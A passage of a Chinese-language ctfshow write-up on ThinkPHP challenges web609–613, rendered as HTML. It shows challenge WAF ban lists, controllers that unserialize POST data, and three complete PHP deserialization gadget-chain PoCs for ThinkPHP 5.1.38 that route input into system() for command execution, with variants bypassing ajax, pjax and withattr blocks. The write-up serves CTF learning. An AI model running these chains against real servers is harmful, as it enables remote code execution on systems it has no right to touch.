    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span><span class="token variable">$ban</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">.</span><span class="token string single-quoted-string">' 这条路子不通，想想其他路子~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="web610"><a href="#web610" class="headerlink" title="web610"></a>web610</h1><p>上题payload秒了</p>
<p>waf：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**
 * 
 * 检查payload是否符合预期
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkPayload</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ban</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invokefunction'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'write'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'invokeFunction'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'param'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cache'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'display'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'Load'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span><span class="token variable">$ban</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">.</span><span class="token string single-quoted-string">' 这条路子不通，想想其他路子~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="web611（5-1-38反序列化rce）"><a href="#web611（5-1-38反序列化rce）" class="headerlink" title="web611（5.1.38反序列化rce）"></a>web611（5.1.38反序列化rce）</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>直接打poc</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span>
<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"0w0"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string double-quoted-string">"calc.exe"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"calc"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"0w0"</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token comment">// 表单ajax伪装变量</span>
        <span class="token string single-quoted-string">'var_ajax'</span>         <span class="token operator">=></span> <span class="token string single-quoted-string">'_ajax'</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"var_ajax"</span><span class="token operator">=></span><span class="token string single-quoted-string">'0w0'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"visible"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240311122335768.png" alt="image-20240311122335768"></p>
<hr>
<h1 id="web612（禁ajax-amp-withattr）"><a href="#web612（禁ajax-amp-withattr）" class="headerlink" title="web612（禁ajax &amp; withattr）"></a>web612（禁ajax &amp; withattr）</h1><p>上一条链子被断了，这下得自己挖了</p>
<p>不过总之还是要围绕怎么调用<code>input</code>函数或者<code>param</code>来做文章 ，直接搜索谁调用input，然后进行分析即可</p>
<p>全局搜一下<code>param</code>，找可控参数多的</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240311163227402.png" alt="image-20240311163227402"></p>
<p>这是之前payload里那条链子的</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240311163242378.png" alt="image-20240311163242378"></p>
<p>这里把 ajax 换成 pjax 就可以整出一条新链子</p>
<p>所以poc为</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span>
<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"0w0"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string double-quoted-string">"calc.exe"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"calc"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"0w0"</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token comment">// 表单pjax伪装变量</span>
        <span class="token string single-quoted-string">'var_pjax'</span>         <span class="token operator">=></span> <span class="token string single-quoted-string">'_pjax'</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"var_pjax"</span><span class="token operator">=></span><span class="token string single-quoted-string">'0w0'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"visible"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"isPjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后我们依旧看一下waf的位置</p>
<p>..&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;Request.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token comment">/**
    * 当前是否Ajax请求
    * @access public
    * @param  bool $ajax  true 获取原始ajax请求
    * @return bool
    */</span>
   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">isAjax</span><span class="token punctuation">(</span><span class="token variable">$ajax</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
       <span class="token variable">$value</span>  <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">server</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'HTTP_X_REQUESTED_WITH'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'xmlhttprequest'</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">true</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span> <span class="token operator">===</span> <span class="token variable">$ajax</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"此链不通"</span><span class="token punctuation">;</span>
       <span class="token comment">#$result           = $this->param($this->config['var_ajax']) ? true : $result;</span>
       <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mergeParam</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
       <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>..&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;Model.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'withattr'</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"此链不通"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">return</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'withAttribute'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>..&#x2F;application&#x2F;index&#x2F;controller&#x2F;Index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"unserialize post data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/withattr/i'</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
               <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"此链不通"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

    	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    		@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token string double-quoted-string">"unserialize post->data"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="web613（禁pjax）"><a href="#web613（禁pjax）" class="headerlink" title="web613（禁pjax）"></a>web613（禁pjax）</h1><p>上一条链子打不通了，继续全局找找<code>param</code></p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240311164624315.png" alt="image-20240311164624315"></p>
<p>那么我们要做的就是让</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'visible'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"__get"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后get传参命令执行即可</p>
<p>poc</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span>
<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"0w0"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string double-quoted-string">"calc.exe"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"calc"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"0w0"</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"visible"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"__get"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
